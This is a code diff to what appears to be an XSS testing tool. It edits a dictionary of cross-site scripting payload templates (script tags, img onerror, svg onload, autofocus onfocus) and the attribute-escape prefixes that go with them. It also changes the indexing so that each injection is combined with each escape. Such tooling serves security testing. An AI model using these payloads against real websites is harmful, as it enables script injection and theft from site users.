@@ -20,26 +20,30 @@ BASE_PAYLOADS = {
     ],
     "INJECT_HTML": [
         {
-            "payload": """<script>FUNCTION('ARGS')</script>""",
-            "used_chars": ['<', '>', '(', ')', "'", '/', 'FUNCTION', 'ARGS']
+            "payload": """<script>FUNCTION(`ARGS`)</script>""",
+            "used_chars": ['<', '>', '(', ')', "`", '/', 'FUNCTION', 'ARGS']
         },
         {
-            "payload": """<img src="x" onerror="FUNCTION('ARGS')">""",
-            "used_chars": ['<', '>', '(', ')', '"', "'", '=', 'FUNCTION', 'ARGS']
+            "payload": """<img src="x" onerror="FUNCTION(`ARGS`)">""",
+            "used_chars": ['<', '>', '(', ')', '"', "`", '=', 'FUNCTION', 'ARGS']
         },
         {
-            "payload": """<svg onload="FUNCTION('ARGS')">""",
-            "used_chars": ['<', '>', '(', ')', '"', "'", '=', 'FUNCTION', 'ARGS']
+            "payload": """<svg onload="FUNCTION(`ARGS`)">""",
+            "used_chars": ['<', '>', '(', ')', '"', "`", '=', 'FUNCTION', 'ARGS']
         },
         {
-            "payload": """<button autofocus onfocus=FUNCTION('ARGS')></button>""",
-            "used_chars": ['<', '>', '(', ')', '"', "'", '=', '/', 'FUNCTION', 'ARGS']
+            "payload": """<button autofocus onfocus=FUNCTION(`ARGS`)></button>""",
+            "used_chars": ['<', '>', '(', ')', '"', "`", '=', '/', 'FUNCTION', 'ARGS']
         }
     ],
     "ESCAPE_HTML": [
         {
             "payload": """">HTML_PAYLOADTAG_TO_ESCAPE""",
             "used_chars": ['"', '/', '>', '<']
+        },
+        {
+            "payload": """'>HTML_PAYLOADTAG_TO_ESCAPE""",
+            "used_chars": ["'", '/', '>', '<']
         }
     ]
 }
@@ -209,10 +213,12 @@ def build_ESCAPE_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
             newIndex = 0
         else:
             newIndex = lastTestedPayload.referredIndex+1
-            if newIndex >= len(BASE_PAYLOADS['INJECT_HTML']): return
+        
+        escapeDBIndex = newIndex // len(BASE_PAYLOADS['INJECT_HTML'])
+        if escapeDBIndex >= len(BASE_PAYLOADS['ESCAPE_HTML']): return
         
         # --- We generate an HTML_INJECTION payload to replace HTML_PAYLOAD ---
-        inj_payload = BASE_PAYLOADS['INJECT_HTML'][newIndex]
+        inj_payload = BASE_PAYLOADS['INJECT_HTML'][newIndex % len(BASE_PAYLOADS['INJECT_HTML'])]
         inj_payload_str = inj_payload['payload']
 
         # TODO: generate payloads for alert and fetch 
@@ -226,7 +232,7 @@ def build_ESCAPE_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
         replace_list_element(usedCharsReplaced_inj, 'ARGS', 'xss')
         # ---------------------------------------------------------------------
 
-        payload = BASE_PAYLOADS['ESCAPE_HTML'][0]
+        payload = BASE_PAYLOADS['ESCAPE_HTML'][escapeDBIndex]
         payload_str = f"{TEST_INPUT}{payload['payload']}EOP"
         
         payload_str = payload_str.replace("HTML_PAYLOAD", inj_payload_str)
